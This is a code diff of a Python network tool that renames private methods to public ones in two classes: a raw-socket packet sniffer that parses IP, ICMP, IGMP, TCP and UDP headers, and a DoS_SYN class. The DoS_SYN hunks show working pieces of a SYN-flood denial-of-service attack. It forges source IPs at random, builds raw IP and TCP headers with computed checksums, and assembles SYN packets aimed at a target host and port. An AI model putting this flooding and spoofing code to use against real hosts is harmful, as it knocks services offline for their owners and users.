@@ -62,7 +62,7 @@ class Sniff :
         self.__raw_buffer = b""
         self.time = time.time()
 
-    def __IPheader(self, raw_payload) :
+    def ip_header(self, raw_payload) :
         payload = struct.unpack("!BBHHHBBH4s4s", raw_payload)
         ver = payload[0] >> 4
         ihl = (payload[0] & 0xf) * 4
@@ -80,7 +80,7 @@ class Sniff :
         return ver, ihl, tos, tln, idn, flg, \
             oft, ttl, prt, csm, src, dst
 
-    def __ICMPheader(self, raw_payload) :
+    def icmp_header(self, raw_payload) :
         payload = struct.unpack("!BBHHH", raw_payload[:8])
         typ = payload[0]
         cod = payload[1]
@@ -90,7 +90,7 @@ class Sniff :
         data = raw_payload[8:]
         return typ, cod, csm, idn, seq, data
 
-    def __IGMPv1header(self, raw_payload) :
+    def igmpv1_header(self, raw_payload) :
         payload = struct.unpack("!BBHL", raw_payload)
         ver = payload[0] >> 4
         typ = payload[0] & 0xf
@@ -99,7 +99,7 @@ class Sniff :
         data = raw_payload[8:]
         return ver, typ, csm, gpa, data
 
-    def __IGMPv2header(self, raw_payload) :
+    def igmpv2_header(self, raw_payload) :
         payload = struct.unpack("!BBHL", raw_payload)
         typ = payload[0]
         mrt = payload[1]
@@ -108,7 +108,7 @@ class Sniff :
         data = raw_payload[8:]
         return typ, mrt, csm, gpa, data
 
-    def __TCPheader(self, raw_payload) :
+    def tcp_header(self, raw_payload) :
         payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
         src = payload[0]
         dst = payload[1]
@@ -130,7 +130,7 @@ class Sniff :
         return src, dst, seq, acn, oft, flg, \
             win, csm, urg, data
 
-    def __UDPheader(self, raw_payload) :
+    def udp_header(self, raw_payload) :
         payload = struct.unpack("!HHHH", raw_payload[:8])
         src = payload[0]
         dst = payload[1]
@@ -144,7 +144,7 @@ class Sniff :
             raise OSError("Can't use socket.IPPROTO_TCP on win32")
         return self.proto
 
-    def __writedata(self, data) :
+    def writedata(self, data) :
         counter = 1
         data = str(data).split("\\")
         text = "\t\t\t"
@@ -167,23 +167,23 @@ class Sniff :
         self.__content += text + "\n\n"
 
         if iph[8] == "ICMP" :
-            typ, cod, csm, idn, seq, data = self.__ICMPheader(self.__raw_buffer[iph[1]:])
+            typ, cod, csm, idn, seq, data = self.icmp_header(self.__raw_buffer[iph[1]:])
             text = f"\tICMP Packet :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.__writedata(data)}"
             self.__content += text + "\n"
 
         elif iph[8] == "IGMP" :
             check = int(binascii.hexlify(self.__raw_buffer[iph[1]:]).decode()[:2])
             if check in [16, 17] :
-                typ, mrt, csm, gpa, data = self.__IGMPv2header(self.__raw_buffer[iph[1]:])
+                typ, mrt, csm, gpa, data = self.igmpv2_header(self.__raw_buffer[iph[1]:])
                 text = f"\tIGMPv2 Packet :{t}Type : {typ}{t}Max Response Time : {mrt}{t}Checksum : {csm}{t}Group Address : {gpa}{t}Raw Data : \n{self.__writedata(data)}"
                 self.__content += text + "\n"
             elif check == 12 :
-                ver, typ, csm, gpa, data = self.__IGMPv1header(self.__raw_buffer[iph[1]:])
+                ver, typ, csm, gpa, data = self.igmpv1_header(self.__raw_buffer[iph[1]:])
                 text = f"\tIGMPv1 Packet :{t}Version : {ver}{t}Type : {typ}{t}Checksum : {csm}{t}Group Address : {gpa}{t}Raw Data : \n{self.__writedata(data)}"
                 self.__content += text + "\n"
 
         elif iph[8] == "TCP" :
-            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.__TCPheader(self.__raw_buffer[iph[1]:])
+            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(self.__raw_buffer[iph[1]:])
             text = f"\tTCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}"
             self.__content += text + "\t"
             text = f"URG:{flg[0]}  ACK:{flg[1]}  PSH:{flg[2]}{t}\tRST:{flg[3]}  SYN:{flg[4]}  FIN:{flg[5]}"
@@ -192,7 +192,7 @@ class Sniff :
             self.__content += text
 
         elif iph[8] == "UDP" :
-            src, dst, tln, csm, data = self.__UDPheader(self.__raw_buffer[iph[1]:])
+            src, dst, tln, csm, data = self.udp_header(self.__raw_buffer[iph[1]:])
             text = f"\tUDP Datagram :{t}Source Port : {src}{t}Destination Port : {dst}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.__writedata(data)}"
             self.__content += text + "\n"
         return
@@ -216,7 +216,7 @@ class Sniff :
                     while True :
                         self.__content = str()
                         self.__raw_buffer = sniff.recvfrom(65535)[0]
-                        iph = self.__IPheader(self.__raw_buffer[0:20])
+                        iph = self.ip_header(self.__raw_buffer[0:20])
                         self.__analysis_proto(iph, counter)
                         self.__content = self.__content.expandtabs(4)
                         print(self.__content)
@@ -239,19 +239,19 @@ class DoS_SYN :
         self.randip = str()
         self.symbol = chr(9608)
 
-    def __ip_header(self, version = 4, ihl = 5, tos = 0, 
+    def ip_header(self, version = 4, ihl = 5, tos = 0, 
                 tlen = 40, iden = 43981, flags = 0, offset = 0, 
                 ttl = 255, proto = socket.IPPROTO_TCP, csum = 0) :
         ihl_version = (version << 4) + ihl
         flags_offset = (flags << 13) + offset
-        self.randip = self.__random_ip()
+        self.randip = self.random_ip()
         src = socket.inet_pton(socket.AF_INET, self.randip)
         dest = socket.inet_pton(socket.AF_INET, self.host)
         packet = struct.pack("BBHHHBBH4s4s", ihl_version, tos, tlen, iden, 
                         flags_offset, ttl, proto, csum, src, dest)
         return packet
 
-    def __tcp_header(self, srcp = 1337, destp = 0, sequ = 0, 
+    def tcp_header(self, srcp = 1337, destp = 0, sequ = 0, 
                 ackn = 0, offset = 5, urg = 0, ack = 0, psh = 0, 
                 rst = 0, syn = 0, fin = 0, win = 8192, csum = 0, urgp = 0) :
         offset = offset << 4
@@ -260,7 +260,7 @@ class DoS_SYN :
                         flags, win, csum, urgp)
         return packet
 
-    def __pseudo_header(self, reserved = 0, proto = socket.IPPROTO_TCP, tcplen = 0) :
+    def pseudo_header(self, reserved = 0, proto = socket.IPPROTO_TCP, tcplen = 0) :
         src = socket.inet_pton(socket.AF_INET, self.randip)
         dest = socket.inet_pton(socket.AF_INET, self.host)
         packet = struct.pack("4s4sBBH", src, dest, reserved, proto, tcplen)
@@ -275,19 +275,19 @@ class DoS_SYN :
         checksum = (~checksum) & 0xffff
         return checksum
 
-    def __random_ip(self) :
+    def random_ip(self) :
         secs = [str(random.randint(1, 255)) for _ in range(0, 4)]
         return ".".join(secs)
 
-    def __prepare(self) :
-        ip_header = self.__ip_header()
+    def prepare(self) :
+        ip_header = self.ip_header()
         ip_header = self.checksum(ip_header)
-        ip_header = self.__ip_header(csum = ip_header)
-        tcp_header = self.__tcp_header(destp = self.port, syn = 1)
-        pseudo_header = self.__pseudo_header(tcplen = len(tcp_header))
+        ip_header = self.ip_header(csum = ip_header)
+        tcp_header = self.tcp_header(destp = self.port, syn = 1)
+        pseudo_header = self.pseudo_header(tcplen = len(tcp_header))
         data = tcp_header + pseudo_header
         tcp_checksum = self.checksum(data)
-        tcp_header = self.__tcp_header(destp = self.port, syn = 1, csum = tcp_checksum)
+        tcp_header = self.tcp_header(destp = self.port, syn = 1, csum = tcp_checksum)
         payload = ip_header + tcp_header
         return payload
 
